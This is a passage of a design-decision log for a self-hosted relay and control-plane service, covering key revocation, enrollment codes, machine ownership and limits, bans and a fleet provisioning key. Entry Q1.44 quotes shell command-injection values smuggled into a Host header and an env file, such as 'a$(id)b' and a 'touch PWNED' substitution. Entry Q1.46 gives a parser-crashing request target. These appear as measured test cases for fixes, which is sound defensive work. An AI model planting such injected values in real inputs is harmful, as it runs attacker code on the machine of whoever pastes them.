instead — and an API key is the one credential here that outlives a password
change, which is what made leaving it a *silent* failure rather than a partial
one. `POST /v1/me/password` revokes every session but the caller's and leaves keys
alone, because a key is a separate credential with a separate lifecycle and
`cpctl` is holding one; somebody who thinks their key leaked revokes the key.
Uniform on self, deliberately: a rule with an exception for the caller is one
somebody has to remember. The consequence is stated rather than special-cased — a
`cpctl` shell holding that key stops working, including the one `install.sh`
persists into `~/.reemoat/cpctl.env` and `deploy/lib.sh`'s `cpctl()` reads, and
the way back is `POST /v1/admin/users/:id/keys`.

**Why everybody gets the route and not only an admin.** The person most likely to
know a key leaked is the person who pasted it somewhere. Revoking the key you are
*holding* is allowed, and refusing it would be refusing the whole point.

**What a listing may say.** `apiKeyRows` returns id, prefix, `createdAt`,
`revokedAt` — never the hash and never the key, which is unrecoverable by
construction. Revoked rows are **listed** here and **filtered** from the count on
`GET /v1/admin/users`, and the asymmetry is the two questions: the count answers
"how many credentials still work", the list answers "is the one that leaked dead
yet", and a row that vanishes on revocation cannot answer the second.

**Measured.** `relaycheck`: a key revokes, `GET /v1/me` immediately answers `401
api_key_revoked`, a second revoke is `404`, revoking it as somebody else's is the
same `404` (the `user_id` clause, not the route, is what makes that true), a reset
retires both of an account's keys and the key that made the request stops working,
and the admin list then counts zero.

**Superseded — one statement, two routes, and no sweep anywhere.** Q7.74 deleted
`POST /v1/admin/users/:id/password`, so the third route and the second `UPDATE`
went with it. What is left is `revokeApiKey` alone:

```
UPDATE api_keys SET revoked_at = ? WHERE id = ? AND user_id = ? AND revoked_at IS NULL
```

reached by `DELETE /v1/me/keys/:keyId` and `DELETE
/v1/admin/users/:id/keys/:keyId` and by nothing else. **No password change on this
service retires a key** — not the self-service one, which never did, and not the
mailed reset that replaced the admin's, which counts the account's live keys into
`apiKeysActive` and revokes none of them. The paragraph above arguing that an
admin reset *must* take the keys with it is not reversed, it is unreachable: there
is no route for the case it was about, because an admin can no longer enter an
account at all.

Two consequences the earlier text has backwards. The way back from a revoked key
is **not** `POST /v1/admin/users/:id/keys`, which is deleted — it is `POST
/v1/me/keys`, self-service, behind `proveCurrentPassword`, which is also the first
thing in this service that ever bounded the table (**10 live per account**, because
until now only an admin could write to it). And "somebody who thinks their key
leaked revokes the key" stopped being advice and became the only mechanism: the
reset does not do it for them, so the sentence is now load-bearing rather than a
preference between two remedies.

**What the driver asserts now.** The same list, minus the reset arm and plus its
inverse — `relaycheck` mints a key through `POST /v1/me/keys` because nothing else
can (`withKey` is deleted), then checks *"changing your own password leaves your
keys alone"* by counting unrevoked rows before and after. The admin-list count and
the listed-but-revoked row are unchanged.

**Status.** Superseded — the sweep went with the admin reset; one `UPDATE
api_keys`, two routes, and no password change retires a key

### Q1.42 — Does an enrollment code outlive the person who minted it?

**Rule.** No, and it does not outlive their *access* either. `burnUserCodes` runs
inside `DELETE /v1/admin/users/:id`'s existing transaction marking every unredeemed
code `used_from = 'user_deleted'`, and inside `POST /v1/admin/users/:id/disable` —
which has no transaction of its own, having never needed one — marking them
`'user_disabled'`. The reason is a **required** `usedFrom: UserCodeBurnReason`
parameter rather than a literal inside the function, so a third caller cannot get
the forensic column wrong by omission.

**Why.** The delete swept every table that authenticates as them — sessions,
origins, passwords, API keys, grants, ownership — and not this one. An unredeemed
enrollment code *is* a credential: `/v1/enroll` sits above THE LINE and asks only
whether the code is unused and unexpired, and redeeming one answers with the
machine id and the fleet's public keys **and** calls `issueTunnelKey`, which
retires whatever tunnel key that machine currently holds. So a just-deleted
account could take a live machine off the relay and put itself on it, using a code
minted a minute before it was removed.

**Why the same sentence had to be applied to `disable`.** Scoping the rule to the
delete route left it reachable through the *reversible* remedy, which is the one an
admin reaches for first. Every other credential that authenticates as a disabled
person is refused by `callerAuth`, which reads `disabled_at` live — but `/v1/enroll`
sits above THE LINE, has no caller at all, and its claim asks only whether the code
is unused and unexpired: never `created_by`, never `users.disabled_at`. So the
paragraph above was true of a banned account word for word. The invariant is about
the **code**, not about the route, and writing it down as a property of one route is
how it came to have a hole.

**`enable` does not give them back**, and the cost is stated rather than
engineered away: a mistaken disable spends one live code (1 hour TTL; minting
another is one request), which is the same trade `enable` already makes about
revoked sessions.

**Rejected.** Extending the burn to `POST /v1/admin/users/:id/password`, which
swept sessions and API keys on exactly the argument that would justify it. That
route was also the *self*-recovery path — an admin re-keying their own account
after a suspected leak — and burning your own in-flight daemon install is a cost
nothing has measured. Left open at Q7.61 rather than decided by symmetry, and
**closed there by deletion**: the route is gone (Q7.74), and `POST /v1/reset`,
the mailed link that replaced it, deliberately does not burn codes either. The
argument above is why, and it did not have to be re-made — proving control of
your own address is not evidence that a daemon you enrolled is compromised. So
the list stays at two writers, `delete` and `disable`.

**`created_by` is still left dangling, on purpose.** That is the distinction the
delete route's own comment draws and this does not reopen: the row's job is to say
what happened, and rewriting history to keep a join valid is the opposite of an
audit trail. The code is burned; the record of who minted it survives naming a
user who is gone.

`'user_deleted'` rather than `'revoked'` because they are different events and
that column is the only forensic trail there is — the same reason
`mintEnrollmentCode` writes `'superseded'` for the code it burns.

**Why it is in `keys.ts`.** The same argument `mintEnrollmentCode` and
`burnMachineCodes` already make one line above: two hand-written copies of one
`UPDATE` is how two routes come to disagree about one of its clauses. It is
synchronous, like every other statement in that block, so it is safe between
`BEGIN` and `COMMIT` on a connection every other writer shares.

**Measured.** `relaycheck` deletes a user holding one live code and asserts the
response's `enrollmentCodesInvalidated`, and that the row reads `user_deleted`
rather than `revoked`. Beside it, the disable mirror: the response reports the
count, the held code answers `409 code_unusable` at `/v1/enroll`, the row reads
`user_disabled` and **not** `user_deleted` — the two acts stay apart in the only
forensic column there is — and `enable` succeeds with the code still burned.

**Status.** Current

### Q1.43 — Can a machine's owner be released, and can it be given back?

**Rule.** Both. `releaseOwner` drops the `machine_owners` row inside the same
transaction as the revoke, on both revoke routes; `PUT
/v1/admin/machines/:id/owner` writes one, with the grant, for a machine that has
none.

**Why release.** `machine_owners` has no `revoked_at`, and its unique index on
`(user_id, label)` does not join `machines`. So a revoked machine went on holding
two things for ever: **the label**, and **one of `MAX_MACHINES_PER_USER`** — the
quota is counted with no revoked filter. Revoke `laptop`, create `laptop` again,
and the answer is a `409` naming a machine that appears in no list and can never
be reached; fifty revocations and the account cannot add a machine at all, with
nothing on screen to explain it. The `machines` row itself is untouched and stays
revoked: the audit trail of which machines existed is in *that* table.

**Why reassignment.** `INSERT INTO machine_owners` happened in exactly one place,
`createOwnedMachine`, which always mints a fresh id. So *becoming* an owner was
inseparable from *creating* a machine, and ownerless was a one-way state:
`POST /v1/admin/machines {ownerId}` reads like an adoption and creates instead,
and after `DELETE /v1/admin/users/:id` reports `machinesReleased` those machines
could never have an owner again — rename, re-enroll and revoke all resolve through
`ownerOf` and answer 404 for the life of the row. A person leaving the fleet
stranded their hardware, and the only remedy was editing SQLite.

**Why the grant goes with it.** `GET /v1/machines` joins `grants`, so an owner
with no grant owns a machine that appears in no list — the exact failure
user-owned machines exists to remove, and the lesson `createOwnedMachine` already
records. Every scope, for the same reason: without `machine:admin` the owner
cannot remove a workspace on their own hardware.

**Rejected.** Also moving the *previous* owner's grant. Ownership and access are
different things here — two people may hold a grant on one machine — and taking
somebody's access away is `DELETE /v1/admin/grants`, its own verb with its own
audit story. A revoked machine is refused rather than adopted, because revoking is
what *frees* the label and the slot and handing one back would spend both on
something nothing can reach.

**Status.** Current

### Q1.44 — Is the enrollment paste shell data or shell source?

**Rule.** Data. `shellQuote` single-quotes both values in
`packages/web/src/enrollment.ts`, and `enrollmentLines` in `cpctl.ts` does the
same, `'\''` included.

**Why.** `controlPlaneUrl` is `publicUrl(c)` — `new URL(c.req.url).origin` — so it
comes from the request's own `Host` header, which anybody who can reach the
service writes. The three lines are then pasted into a shell on another machine by
a person who is looking at a plausible URL. This is the identical rule
`deploy/lib.sh`'s `set_env`/`sq` already applies to the env file after the
`REEMOAT_ENROLL_CODE=xy$(touch PWNED)` incident (Q7.57); it was applied to the
file and not to the paste, which is the same text arriving by hand into the same
shell.

**Measured, 2026-08-08, through a real `node:http` server.** ``Host: a`id`b``,
`a$(id)b`, `a'b` and `a;id` **all** reach `URL.origin` intact — including the
apostrophe, which is why plain quoting without the escape would still be
steppable-out-of, and which makes the `'\''` arm reachable rather than defensive.
The failure was measured too: sourcing ``export
REEMOAT_CONTROL_PLANE=http://a`touch PWNED`b`` creates the file and leaves the
variable reading `http://ab`, so the person pasting sees a plausible URL and
nothing else.

**How the two copies are kept agreeing.** By running one of them.
`packages/web/scripts/webcheck.ts` reads `cpctl.ts` off disk, slices
`enrollmentLines`'s body out (header line to a bare `}` in column 0), strips the
one TypeScript annotation in it, and hands it to `new Function` — then compares
five value pairs against the web copy and asserts that `|| BASE_URL` is the *only*
permitted divergence. The docblock used to claim the two were "kept
byte-identical … on purpose" with nothing enforcing it, which is the failure mode
`sessionOf` is named for; comparing behaviour rather than a transcription of it is
what closed it.

**Status.** Current

### Q1.45 — Does `?token=` authenticate anything other than the WebSocket handshake?

**Rule.** No, on the daemon. `readCredential` reads `?token=` only when the request
carries `upgrade: websocket`; a present-but-malformed `Authorization` header still
short-circuits to a failure rather than falling through, as it always did.

**Why.** The exception has one justification and it has always been written down —
"a browser cannot set headers on a WebSocket" — but nothing ever *narrowed* it to
that case. `readCredential` is called from the single `app.use("*")` gate, so `GET
/sessions/s_1/files?path=chart.png&token=<jws>` returned the file's bytes to a URL
that lands in browser history, in `Referer`, and in the log of every intermediary,
on the very origin whose `localStorage` holds `reemoat.credential`. Q2.38 refused
`<a href="…&token=" download>` partly on the grounds that it "would widen the
`?token=` exception" — an argument about discipline against a hole that was already
open.

**Keyed on the handshake header, not on the stream route's path.** A route reader
fails open the day it falls behind; the header is the thing the exception is
actually about.

**What it does not close.** Somebody who already holds the token can still craft
the request by hand. What is closed is the URL a browser *follows*, which never
carries that header.

**Measured.** `daemoncheck`, inside "the stream, over a real socket": `GET
/sessions?token=` and `GET /sessions/:id/files?path=notes.txt&token=` are both 401
with no header, the header path is still 200, and the same token on a request
carrying `Upgrade: websocket` still authenticates — the existing `attach()` helper,
which passes its token only in the URL as a `ws://` client must, is the live
positive control. Reverting turns both 401s into 200s, one of them serving a file.

**Consequence.** The relay is deliberately **not** narrowed the same way: its
`readToken` reads the query on both paths, because that is where the browser's
socket arrives. A relayed non-upgrade request carrying a query token is therefore
authorized at the relay and then refused by the daemon.

**Status.** Current

### Q1.46 — What happens to a request target Node's HTTP parser accepts and `new URL` rejects?

**Rule.** It is answered `401 missing_token` and its socket is released.
`readToken` returns `null` when the URL parse throws.

**Measured, in this repo's Node.** `GET //% HTTP/1.1` is accepted by llhttp and
handed to the handler as `req.url === "//%"`; `new URL("//%", "http://relay")`
throws `Invalid URL`, as do `/\` and `//[`. Both halves were re-measured before the
patch, because either one moving makes the case vacuous.

**Why it mattered.** `readToken` runs **first** on both `handleRequest` and
`handleUpgrade`, before `authorize`, so the throw was reachable with no credential
at all against the only listener this system requires to be internet-facing. It
escaped the `'request'`/`'upgrade'` emit into `main.ts`'s `uncaughtException`
backstop — which keeps the process alive while nothing writes a response and
nothing destroys the socket: `requestTimeout` was already cleared and
`keepAliveTimeout` only arms once a response is sent. One unauthenticated line per
leaked fd, until the limit stops every daemon dialling in.

**`pathOf` had the identical guard and it was dead code**, because `readToken`
parsed the same URL first and threw. The guarded copy was the one nobody could
reach; the unguarded one was on the unauthenticated path.

**Rejected.** Wrapping the whole bodies of `handleRequest`/`handleUpgrade` in
try/catch as belt and braces. Those are two hot paths whose refusal arms already
write to the socket, and it would convert any *future* throw into a swallowed 400
rather than the `uncaughtException` log that is currently the only signal such a bug
exists. The named hole is closed at its one source; a second escaping throw remains
possible in principle and is now the only remaining case.

**Measured.** `relaycheck` sends all three targets on a raw `node:net` socket —
`fetch` and `ws` both normalize the target through the parser this is about, so
there is no other way to send one — on the request path and on a real `Upgrade:`
handshake, and asserts `401` with `missing_token` in the envelope and
`requestsProxied` unmoved. Reverting the guard does not merely redden those lines:
it takes the driver down with an uncaught exception, which is what it does to the
service minus the backstop.

**Status.** Current

### Q1.47 — Can a mistyped relay URL take the daemon down?

**Rule.** No. `RelayTunnel.dial` **checks** the scheme rather than assigning over
it, emits `rejected` naming the scheme, and does not retry; `new WebSocket` is
inside its own try for the same outcome.

**Why.** `target.protocol = "ws:"` is a silent no-op when the URL's scheme is not
one the spec calls special. So `htps://relay.example` — which `new URL` accepts, and
which is therefore accepted by `enroll.ts` and by the control plane's own `main.ts`,
both of which "validate" a relay URL with that constructor — kept `htps:`, fell
through the old guard, and threw out of `new WebSocket` **outside** the try, into a
process `scripts/daemon.ts` gives no `uncaughtException` handler. Under a unit with
`KeepAlive`/`RunAtLoad` that is a permanent crash loop whose every pass re-runs
`restore()` and auto-resume, spawning agents that are killed seconds later. The
file's own header promises that a relay which is down, unreachable or rejecting
costs nothing but log lines.

**`ws`/`wss` are in the allowed set** beside `http`/`https`, because a URL already
stored in that form must still dial — the guard is "these four", not "not-http".

**Still not done.** Validating the scheme where it is *claimed* to be validated.
Three call sites construct a `URL` and conclude the value is good; none of them
looks at what came back.

**Measured.** `daemoncheck` drives `RelayTunnel.start` with the typo and asserts it
does not throw, reports `rejected`, names the scheme and dials nothing; that an
unparseable URL is still refused by the arm that already existed; and that
`ws://127.0.0.1:1` still reaches `connecting` with its scheme intact, which is what
pins that the set was *widened* rather than the guard "fixed" by refusing
everything non-http.

**Status.** Current

### Q1.48 — Which paths must ask whether a machine's name is already visible?

**Rule.** All five. `nameVisibleTo` guards `POST /v1/machines`, `PATCH
/v1/machines/:id`, `PUT /v1/admin/machines/:id/owner` and the `ownerId` branch of
`POST /v1/admin/machines`; `nameVisibleToGrantees` guards `PATCH
/v1/admin/machines/:id`.

**Why a wider check than the index.** `machine_owners` is unique on `(user_id,
label)` and that index is BINARY and knows nothing about a machine somebody merely
holds a *grant* on, or a legacy row they see under `machines.name` — which are
exactly what a second `laptop` collides with in the only list a human reads. Two
indistinguishable rows, and `resolveMachineRef` tries `machine_owners.label` before
`machines.name`, so `POST /v1/tokens {machine: "laptop"}` silently resolves to one
of them and the other becomes unreachable by name.

**Why the admin door needed it too.** `POST /v1/admin/machines {ownerId}` is the
route `deploy/install.sh`'s daemon wizard drives, and it went straight to
`createOwnedMachine` — i.e. relied on the index alone — so an admin registering a
machine *for* somebody produced exactly the state the guard was written to prevent.

**Why the rename needed a different function.** A legacy row has no owner to ask
about: `PATCH /v1/admin/machines/:id` checked only `SELECT id FROM machines WHERE
name = ? AND id != ?`, which cannot see the collision, because an *owned* machine's
`machines.name` is `qualifiedName(label, id)` and never the bare label. So renaming
an ownerless machine to `laptop` shadowed the `laptop` its own grantee owns, with
the uniqueness check passing. `nameVisibleToGrantees` asks `nameVisibleTo` once per
user holding a grant.

**Measured.** `relaycheck` uses only the two shapes that discriminate, and says so:
posting a label the owner already owns *in the same case* is caught by the index and
answers the identical 409 either way, so a case built on it would have been green
before the guard existed. What is asserted is an ownerless legacy machine the target
holds a grant on (refused through both doors, as a pair) and `DESK` against an owned
`desk`, which the BINARY index cannot see at all.

**Status.** Current

### Q1.49 — Can `cpctl` reach the two routes that require proving your own account?

**Decision.** Yes, by prompting. `selfProof(targetUserId)` GETs `/v1/me` and, only
when the target is the caller **and** `hasPassword` is true, asks for the current
password and returns it as the body; otherwise it sends nothing and asks nothing.

**Why.** Q1.610 made `proveSelf` require `currentPassword` on `POST
/v1/admin/users/:id/password` and `POST /v1/admin/users/:id/keys` aimed at self, and
`cpctl` sent no body at all — so both answered `400` about a body the CLI had never
been asked to send. That made the single-admin recovery path unreachable from a
terminal, which is the one place it matters: `install.sh` itself prints `pnpm cpctl
admin passwd <userId>`, and the web reset sweeps every API key including the one
`cpctl` is holding.

**Why it asks nothing when the target is somebody else.** A CLI that prompts for a
password it then discards trains an operator to type one whenever it asks. The
`hasPassword` question is the migration exception, mirrored from `case "passwd"`:
`proveSelf` lets an account with no password row past on its API key, so asking for
a secret it has never had would be theatre.

**Consequence.** One extra `GET /v1/me` per invocation, and aimed at yourself in a
non-tty context these now block reading stdin where they used to fail fast with an
unusable 400. `proveSelf` also stopped answering "expected a JSON object body" — a
null body falls through to the `currentPassword` check, so the 400 names the field —
with the same status and code, so `authFailure` reads it identically.

**Measured.** `relaycheck` runs cpctl's own `selfProof` body, extracted off disk the
way `webcheck` runs `enrollmentLines` (the file cannot be imported: its module body
reads `process.argv` and dispatches, and neither symbol is exported), against the
live app with a stubbed `api` and `readSecret`. What it used to send is a 400 from
the real route; what it sends now mints the key with a 201. The call-site wiring is a
source-substring count and the comment beside it says so, because driving it needs
`main()`, a listener and a subprocess.

**Superseded — there are no such routes, so there is nothing to aim at an `:id`.**
Q7.74 deleted both, and `cpctl`'s `admin passwd` and `admin key` went with them;
`relaycheck` now asserts their *absence* by the same source-reading technique,
`/case "passwd"/` and `/case "key"/` tested against the slice of `cpctl.ts` after
`async function admin(` and expected `false`. Proving a deletion is the point:
nothing else here would notice a route quietly still registered, and "we removed
it" is the kind of claim that survives a revert.

What is left of `selfProof` is `currentPasswordBody()`, which takes **no argument**
— that is the whole difference, and it is what makes the heading unanswerable
rather than answered. There is no target to compare against `me.id`, so the
`hasPassword` question is the only one left: `GET /v1/me`, and if there is a
password row, prompt for it and send `{currentPassword}`; otherwise send `{}`. It
serves `cpctl passwd` and `cpctl key`, both of which are now about the caller by
construction.

**The `bodyOf` extraction is deleted, and the order in which that had to happen is
the durable lesson.** It threw at module scope when the named function was missing,
so removing `selfProof` from `cpctl.ts` without removing the driver block made
`pnpm relaycheck` **crash on import** rather than report a failure — and a driver
that dies takes its other nine hundred assertions with it. A source-reading check
that fails loudly is right; one that fails *before the run starts* is not.

**Status.** Superseded — both routes are deleted; `selfProof` became the
argumentless `currentPasswordBody`, and the driver now asserts the deletion

### Q1.50 — What happens when two admins create the same user at once?

**Rule.** The loser gets `409 user_exists` in the error envelope.
`POST /v1/admin/users` catches its `ROLLBACK`ed insert and maps a uniqueness failure
through `isUniqueViolation`, which `machines.ts` now exports rather than having it
written a third time.

**Why the read cannot be moved.** The guard is `SELECT id FROM users WHERE name = ?`
and the INSERT is on the other side of ~51ms of scrypt, so the window is the full
KDF and no reordering closes it. Rethrown, the violation reached Hono's default
handler and answered `500 text/plain` — a body with no `error.code` — from the
request that answers `409 user_exists` a second later.

**What the `ROLLBACK` in front of the 409 protects** is not visible in the 409: the
loser throws on the first statement inside its transaction, and what an
un-rolled-back `BEGIN` takes out is the *next* writer on the shared connection.

**Rejected.** An `app.onError` envelope renderer. That is a service-wide contract
change rather than the smallest correct fix, and it would mask the next unmapped
throw instead of surfacing it.

**Consequence, said out loud rather than claimed away.** `isUniqueViolation` is a
string match on the driver's message, so in principle a primary-key collision maps
to `user_exists` too. Every other unique column in that transaction is a PK holding
an id `newId` just minted from fresh random bytes.

**Measured.** `relaycheck` fires two concurrent creates of one name: statuses sort
to `201,409`, the loser's `content-type` is `application/json` and its code is
`user_exists` (a non-JSON body is reported with its text, because that *is* the
defect), exactly one user row and one password row landed, and the next create still
answers 201.

**Status.** Current

### Q1.51 — How many machines may one person run, and what happens when that number goes down?

**Decision.** A configurable limit beside the existing ceiling, and **being over
it is derived, never stored**. A machine is over iff its *rank* among its owner's
machines — ordered by `(machine_owners.created_at, machine_id)` ascending — is
`>= effectiveLimit(owner)`. Lowering the limit switches off the ones acquired most
recently; raising it switches them back on. Nothing is written to a machine either
way.

**Why a second bound rather than making the first one configurable.**
`MAX_MACHINES_PER_USER = 50` has its own recorded argument, and it is anti-abuse:
creating a machine is reachable by anybody with a password, and each one is a row
plus a code plus a tunnel credential against a `synchronous = FULL` file in the
process carrying every tunnel. The new one is commercial — a number an admin
*raises to sell*. Collapsed into one, an admin typing 500 for a customer has
silently removed the database-growth bound, and that failure is not a refusal
anybody sees: it is a slow instance. So the ceiling is refused on both write paths
and clamped again on read, and the configurable limit can only ever be lower.

**Why derived rather than a `suspended` column.** A stored flag needs a writer on
every path that could change the answer — create, revoke, adopt, delete, disable,
and both limit writes — and the one that gets forgotten is the one that leaves
somebody's machine dark after the admin has already fixed it. Derived, three
things are free: raising un-suspends with no recompute; **revoking promotes**,
because `releaseOwner` deletes the ownership row and every later rank decrements;
and a create/count race cannot overshoot the bound, since an extra machine is
simply rank ≥ limit and does not work. That last one is why nothing here needs a
transaction it did not already have.

**Why acquisition order and not last connection.** "The most recently connected
machine stops working" reads as ordering by tunnel activity, and that oscillates:
the suspended machine cannot connect, so its last-connect timestamp stays old, so
it becomes the *oldest*, so it un-suspends and takes the other one down instead —
on every poll, for ever.

**Why the tiebreak is not tidiness.** `created_at` is `Date.now()` and two
machines acquired in the same millisecond are reachable from a script. Without the
`machine_id` half of the row-value comparison both rows count zero older siblings,
both report rank 0, and an account with a limit of 1 keeps two working machines —
the bound wrong by one, silently, which is the only way a commercial limit fails
that nobody notices. `relaycheck` inserts two rows sharing a timestamp for exactly
this.

**Why `rowid` is not the ordering.** `releaseOwner` DELETEs and SQLite reuses
rowids unless the table is `AUTOINCREMENT`, so a revoke-then-create would silently
reorder somebody's fleet.

**Where the check sits, and why last.** After the grant is proved, in
`relay/authorize.ts` and in `POST /v1/tokens` alike. Both routes answer the same
refusal for "no such machine" and "no grant" so a caller cannot map the fleet;
this one names a real state — which is the point, because the owner has to see
*why* their machine stopped. Asked any earlier it is an enumeration oracle: any
valid token would report whether an arbitrary `aud` exists and is over somebody's
limit. `403 machine_over_limit`, matching `no_scopes` rather than the shared 404,
because the caller is known and the machine is present.

**Why the tunnel is refused at dial, unlike a plain refusal.** Letting an
over-limit daemon hold a tunnel that carries nothing makes `relayOnline` a lie —
it is read by `POST /v1/tokens` and `GET /v1/machines`, so the machine presents as
*online and broken*, indistinguishable from a relay fault. Refused at dial it is
`relayOnline: false`, which every client already draws and explains, plus
`overLimit: true`, which turns "asleep" into "switched off, and here is why". The
daemon's existing 1s→30s full-jitter backoff then becomes the recovery mechanism
rather than a cost.

**Unset means 50, and that is load-bearing rather than a default.** Nothing seeds
`instance_settings`, deliberately, so this setting is unset on every existing
deployment. If unset resolved to 0 the next deploy would take every machine in the
fleet off the network with no operator having acted. Unset means *exactly the
behaviour before this setting existed*; 0 is a value somebody chooses.

**An ownerless machine is unlimited**, because there is no owner to have a limit.
See Q7.95.

**A bug this feature created, and fixed.** `PUT /v1/admin/machines/:id/owner` did
`releaseOwner` + `INSERT … created_at = now` unconditionally. For a transfer that
is right — the machine becomes the new owner's newest acquisition. But that route
is *also* the admin's only re-label, which is why its own count excludes
`machine_id != ?`, and re-stamping there moved a machine to the back of its own
owner's queue and silently changed which of their machines the limit switches off.
It preserves `created_at` when the owner is unchanged now.

**Measured.** `relaycheck` drives the whole of it: three machines inserted in the
order 3, 1, 2 so an implementation ordering by rowid, id or insertion would agree
with a naive fixture and disagree with this one; raising un-suspends with the same
token and no other act; revoking the oldest promotes the one that was over; two
rows sharing a timestamp still rank apart and the same one twice; a caller with no
grant still gets the shared 404; a lowering deletes nothing and reports what it
switched off.

**Status.** Current

### Q1.52 — What should banning somebody do to the machines they own?

**Decision.** Switch them off, **reversibly and without revoking anything**. A
machine whose owner is banned is refused at the relay, refused at the tunnel
dial, and refused a token — derived from `users.disabled_at` by `quota.ts`, on
the row it already reads, so it costs no extra query on the per-request path.
`enable` brings the whole fleet back on the daemons' own backoff with nobody
touching a host.

**The hole this closes, which had nothing to do with quotas.**
`relay/authorize.ts` reads `disabled_at` for the **caller** —
`activeUser(db, claims.sub)` — and nothing anywhere read it for the *owner*. So
banning somebody stopped them signing in and stopped nothing else: every machine
they owned went on serving anybody holding a grant, and their daemons went on
holding tunnels. The ban looked total and was not.

**Why not revoke instead.** `disable` is the **reversible** remedy — that is its
whole job, against `delete` which is not — and revoking a machine is not
reversible in the part that matters: it must be registered again and enrolled
again *on its host*. A ban that revoked machines would make the undoable act
undoable everywhere except where it costs a trip to the hardware, and a mistaken
ban would cost somebody their entire fleet permanently. Derived costs nothing and
undoes itself.

**Why a separate code from `machine_over_limit`, and separate from
`user_disabled`.** Three refusals, three strings, and the middle one is a trap:
`user_disabled` means *you* are banned and the client ends the session on it, so
reusing it here would sign a perfectly good grantee out of the whole app for
opening somebody else's suspended machine. `owner_disabled` is a fact about the
machine, not the caller. It is in `meansMachineGone` (stop believing this route)
and **not** in `authFailure` (end this session), and `webcheck` asserts both
halves — the code-surface walk still answers "six codes end a session, and no
more" with `owner_disabled` present in the table.

**And separate from the limit** because the *remedies* differ: retiring a machine
does nothing for one whose owner is banned. The badge and the subline order the
ban first for that reason.

**What delete does instead, and why the two differ.** `DELETE
/v1/admin/users/:id` revokes their machines outright — see Q7.95. The person is
gone, so there is nobody for a reversible state to be reversed *for*, and leaving
the machines live-and-ownerless was the actual hole.

**Measured.** `relaycheck` drives it through a grantee, which is the only caller
who can reach it — a banned owner cannot get past `callerAuth` at all: reachable
before the ban, `403 owner_disabled` after it, the body carrying `owner_disabled`
and *not* `user_disabled`, reachable again the moment the ban lifts with the same
token, and `machines.revoked_at` still null throughout.

**Status.** Current

### Q1.53 — How does an admin add a daemon for somebody else?

**Decision.** A fleet **provisioning key**: one long-lived credential, minted and
rotated in Settings → Server settings, that authorizes exactly one route —
`POST /v1/provision`, which creates a machine owned by a named user, raises that
user's machine limit far enough for it to work, and mints the enrollment code.
Nothing else.

**Why anything was needed.** Adding a machine required a credential belonging to
whoever would own it: their own sign-in for the web form, or an API key for
`cpctl`. So an admin setting up a host for somebody had to borrow their account
or hand them a credential. The admin's *own* key would work and is full authority
over the fleet — not a thing to paste into an install script on somebody else's
laptop.

**The daemon never sees it, and that is forced rather than chosen.** This
service's oldest invariant is that a daemon makes exactly one control-plane
request, ever, at enrollment. So provisioning is an act of the **installer**:
`install.sh` or `cpctl provision` trades the key for an ordinary single-use
enrollment code and writes it into the env file. `enroll.ts`, the daemon and the
tunnel path are untouched — which also means the key never lands on the host in a
form the daemon would keep.

**Above THE LINE, because it carries its own credential.** `callerAuth` resolves
API keys and session tokens and would refuse a `pk_` outright, so this joins
`/v1/enroll` as a route that authenticates itself. The public set is **ten** now,
and two of them take a credential in the body. It is not an unauthenticated
route; the credential is simply not a person's. It carries
`PUBLIC_BODY_LIMIT_BYTES` and its own throttle namespace (`provisionKey`), and
the throttle matters more here than for `/v1/enroll`: a provisioning key is
long-lived and fleet-wide, so guessing it is the attack, where an enrollment code
is single-use and lives an hour.

**The limit is raised rather than the request refused**, and by `owned + 1`
rather than `limit + 1`. An admin provisioning a machine has already decided that
person may have it, and a `409` at that moment means an install script fails and
somebody goes to change a number. `owned + 1` is exactly enough — incrementing an
already-generous limit would quietly widen it — and it is written as a **visible
override**, so Settings → Users shows where the number came from rather than an
admin finding one they did not set. `createOwnedMachine` still clamps against
`MAX_MACHINES_PER_USER`, so this cannot climb past the fleet ceiling.

**One key, and minting is the only verb.** `POST` retires the previous row in
the same transaction that inserts the new one: the reason to mint a second is
that the first leaked, and a window in which both work is the window being
closed. There is deliberately **no revoke and no "off"** — that would be a third
state to reason about for a fleet that either hands out hosts or does not, and a
key is useless to anybody who cannot also reach `POST /v1/provision`.

**Nothing draws the key or any part of it.** `GET /v1/admin/provisioning-key`
answers `{minted: boolean}` — not the value, not a prefix, not an id — because
the only act available is minting another, so a richer projection would exist
purely to be a second place a live credential can be read from. That is the rule
`GET /v1/admin/settings` already follows by sending `null` for `smtp.password`.
The row keeps its `prefix` and `id` regardless, so the trail is legible in the
database even though no interface prints it.

**A multi-key model was built and taken back out**, and it is recorded because
the want behind it is real. Briefly the screen listed every live key with a
per-row revoke, on the reasoning that a fleet might run one installer per site.
What that cost was worse than what it bought: it made "which key is live" a thing
to track, gave the screen a credential list to draw, and turned the leak remedy
from one tap into finding the right row first. One key and one verb is the
smaller thing that does the job.

**Where the key may live, which is the rule this feature is easiest to get
wrong.** It belongs on the machine you provision *from*, and **never on the host
being provisioned**. That host runs a daemon, a daemon runs agents as the
machine's owner, and `agentEnv`'s strip is hygiene rather than a fence — CLAUDE.md
says so outright: the agent has that uid and can read the env file,
`/proc/<pid>/environ` and `REEMOAT_DB`. A fleet-wide credential there is any
machine owner able to provision for anybody, permanently.

`install.sh` asked for it on the host being set up, and the minted-key note said
"put it in `REEMOAT_CP_PROVISION_KEY` where a host is installed" — both written
here first and both wrong. The prompt is gone and the note is a warning. What
travels to a host is the **enrollment code**, which is single-use and lives an
hour: the blast radius of one machine rather than of the fleet.

**Rejected: making the key single-use.** It was proposed for exactly the right
reason — if the key reaches a daemon host it should be worth one machine rather
than all of them — but with the key kept off that host the trade inverts. A
single-use key is an enrollment code with owner selection, and this service
already has enrollment codes; what makes the provisioning key worth having is
that one credential sets up twenty hosts without the installer holding an
account. Reuse *is* the feature. The leak remedy stays one remint, which retires
the previous key in the same act.

**⚠ The threat is not the obvious one.** Holding this key reads nobody's work.
What it does is insert a machine of the holder's own into any user's list — and
that user may then run agents on the holder's host. That is why it is a table
with `revoked_at` rather than a value in `instance_settings`, why only a hash is
kept, and why the screen says so above the button rather than below it.

**`created_by` on the minted enrollment code is the key's id, not the owner's.**
That column is an enrollment code's only forensic trail, and writing the owner
there would record that they minted a code for a host they may never have heard
of. A `pk_…` in it is greppable and true.

**Refused rather than allowed:** provisioning for a **disabled** user, because
their machines are switched off the moment they exist (Q1.52) and the installer
would produce a daemon nothing can reach; and for an unknown user, with a 404
rather than a machine nobody owns.

**Measured.** `relaycheck` drives the whole surface with **no `authorization`
header at all**, which is the feature: it provisions, the machine lands owned and
granted, the limit rises to exactly `owned + 1` as a visible override, rotation
retires the old key and the old key stops working in the same breath, and the key
authenticates neither `/v1/me` nor an admin route. The status route answers
`null` after provisioning is turned off, and never carries a key in any case.

**Status.** Current

